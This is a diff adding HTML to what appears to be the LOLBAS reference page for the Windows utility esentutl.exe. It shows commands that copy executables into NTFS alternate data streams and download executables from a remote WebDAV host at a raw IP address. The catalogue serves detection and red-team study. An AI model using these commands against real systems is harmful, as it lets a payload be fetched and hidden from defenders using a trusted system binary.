@@ -31,7 +31,151 @@
 </h1>
 
 
+<ul class="function-list">
+    
+    
+    <li><a href="/lolbas/Binaries/Esentutl/#copy">Copy</a></li>
+    
+    
+    <li><a href="/lolbas/Binaries/Esentutl/#ads">Alternate data streams</a></li>
+    
+    
+    <li><a href="/lolbas/Binaries/Esentutl/#download">Download</a></li>
+    
+</ul>
 
+
+
+<br>
+<p><b>Paths:</b> 
+	<ul style="list-style-type:none">
+	
+	<li>c:\windows\system32\esentutl.exe</li>
+	
+	<li>c:\windows\sysWOW64\esentutl.exe</li>
+	 
+	</ul>
+</p>
+<br>
+<b>Resources:</b> 	
+	<ul style="list-style-type:none">
+	
+	<li><a href="https://twitter.com/egre55/status/985994639202283520">https://twitter.com/egre55/status/985994639202283520</a></li>
+	 
+	</ul>
+<br>
+<b>Contributors:</b> <p>Thanks to egre55 - @egre55</p>
+
+<br>
+
+
+
+
+
+
+<h2 id="copy" class="function-name">Copy</h2>
+
+<p>The LOLBAS can copy file.</p>
+
+
+<ul class="examples">
+
+    
+
+
+
+    <li>
+        <p>Copies the source VBS file to the destination VBS file.</p>
+
+        <pre><code>esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o</code></pre>
+    </li>
+
+    
+
+</ul>
+<br>
+
+
+
+
+
+<h2 id="ads" class="function-name">Alternate data streams</h2>
+
+<p>The LOLBAS can write or read alternate data streams.</p>
+
+
+<ul class="examples">
+
+    
+
+
+
+    <li>
+        <p>Copies the source EXE to an Alternate Data Stream (ADS) of the destination file.</p>
+
+        <pre><code>esentutl.exe /y C:\ADS\file.exe /d c:\ADS\file.txt:file.exe /o</code></pre>
+    </li>
+
+    
+
+
+
+    <li>
+        <p>Copies the source Alternate Data Stream (ADS) to the destination EXE.</p>
+
+        <pre><code>esentutl.exe /y C:\ADS\file.txt:file.exe /d c:\ADS\file.exe /o</code></pre>
+    </li>
+
+    
+
+
+
+    <li>
+        <p>Copies the source EXE to the destination Alternate Data Stream (ADS) of the destination file.</p>
+
+        <pre><code>esentutl.exe /y \\82.221.113.85\webdav\file.exe /d c:\ADS\file.txt:file.exe /o</code></pre>
+    </li>
+
+    
+
+</ul>
+<br>
+
+
+
+
+
+<h2 id="download" class="function-name">Download</h2>
+
+<p>The LOLBAS can download files.</p>
+
+
+<ul class="examples">
+
+    
+
+
+
+    <li>
+        <p>Copies the source EXE to the destination EXE file.</p>
+
+        <pre><code>esentutl.exe /y \\82.221.113.85\webdav\file.exe /d c:\ADS\file.exe /o</code></pre>
+    </li>
+
+    
+
+
+
+    <li>
+        <p>Copies the source EXE to the destination EXE file</p>
+
+        <pre><code>esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserver\webdav\adrestore.exe /o</code></pre>
+    </li>
+
+    
+
+</ul>
+<br>
 
 
 
